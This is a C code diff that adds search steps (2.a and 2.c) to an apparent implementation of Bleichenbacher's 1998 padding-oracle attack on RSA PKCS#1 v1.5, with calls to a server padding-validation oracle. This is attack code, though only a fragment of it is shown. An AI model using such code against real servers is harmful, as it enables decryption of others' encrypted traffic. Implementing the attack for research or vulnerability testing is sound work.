@@ -49,6 +49,36 @@ int b98_compute_frac_sub(mpz_t result, const mpz_t a, const mpz_t x, const mpz_t
 	return b98_compute_frac(result, a, x, b, d, B98_FRAC_SUB);
 }
 
+/*
+ *  Compute the minimal r value at Step 2.c (1) for s-search
+ */
+int b98_compute_min_r(mpz_t r, const mpz_t s_1, const mpz_t b, const  mpz_t min_range, const  mpz_t n )
+{
+	int frac_retcode;
+
+	frac_retcode = b98_compute_frac_sub(r, b, s_1, min_range, n);
+	mpz_mul_ui(r, r, 2);
+
+	return frac_retcode;
+}
+
+/*
+ *  Compute the lower bound s value at Step 2.c (1) for s-search
+ */
+int b98_compute_min_s(mpz_t min_s, const mpz_t r_1, const mpz_t b, const mpz_t min_range, const mpz_t n )
+{
+	return b98_compute_frac_add(min_s, r_1, n, min_range, b);
+}
+
+
+/*
+ *   Compute the upper bound s value at Step 2.c (1) for s-search
+ */
+int b98_compute_max_s(mpz_t max_s, const mpz_t r_1, const mpz_t a, const mpz_t max_range, const mpz_t n )
+{
+	return b98_compute_frac_add(max_s, r_1, n, max_range, a);
+}
+
 /* 
  *  Update the lower bound for plaintext candidates domain
  */
@@ -141,23 +171,6 @@ int b98_init(struct bleichenbacher_98_t *b98, const size_t rsa_byte_len, const m
 }
 
 /*
- * Step 2.a of bleichenbacher's algorithm : initial search
- */
-int b98_initial_search(struct bleichenbacher_98_t *b98)
-{
-	int pad_check = 0x00;
-
-	mpz_cdiv_q (b98->s, b98->n, b98->max_range);
-	while(!pad_check)
-	{
-		mpz_add_ui(b98->s, b98->s, 1);
-		pad_check = b98_check_padding(b98);
-	}
-
-	return 0x00;
-}
-
-/*
  *  Free any allocated resources
  */
 int b98_cleanup(struct bleichenbacher_98_t *b98)
@@ -179,6 +192,61 @@ int b98_cleanup(struct bleichenbacher_98_t *b98)
 	b98 -> server_padding_validate = NULL;
 	return 0x00;
 }
+
+/*
+ * Step 2.a of bleichenbacher's algorithm : initial search
+ */
+int b98_initial_search(struct bleichenbacher_98_t *b98)
+{
+	int pad_check = 0x00;
+
+	mpz_cdiv_q (b98->s, b98->n, b98->max_range);
+	while(!pad_check)
+	{
+		mpz_add_ui(b98->s, b98->s, 1);
+		pad_check = b98_check_padding(b98);
+	}
+
+	return 0x00;
+}
+
+/*
+ * Step 2.c of bleichenbacher's algorithm : search when the domain consists
+ * of a single interval
+ */
+int b98_search_single_range(struct bleichenbacher_98_t *b98)
+{
+	int pad_check = 0x00;
+	mpz_t min_s, max_s;
+
+	mpz_init(min_s);
+	mpz_init(max_s);
+
+	b98_compute_min_r(b98->r, b98->s, b98->b, b98->min_range, b98->n);
+	while (0x01 != pad_check && mpz_cmp(b98->r, b98->max_range) <= 0)
+	{
+		b98_compute_min_s(min_s, b98->r, b98->b, b98->min_range, b98->n);
+		b98_compute_max_s(max_s, b98->r, b98->a, b98->max_range, b98->n);
+		
+		mpz_set(b98->s, min_s);
+		while (mpz_cmp(b98->s, max_s) < 0 && 0x1 != pad_check)
+		{
+			mpz_add_ui(b98->s, b98->s, 1);
+			pad_check = b98_check_padding(b98);
+		}
+
+		/* solution found */
+		if (pad_check)
+			break;
+
+		mpz_add_ui(b98->r, b98->r, 1);
+	}
+
+	mpz_clear(min_s);
+	mpz_clear(max_s);
+	return pad_check;
+}
+
 
 /*
  *  Check server padding for ciphertext "c*(s**e)".
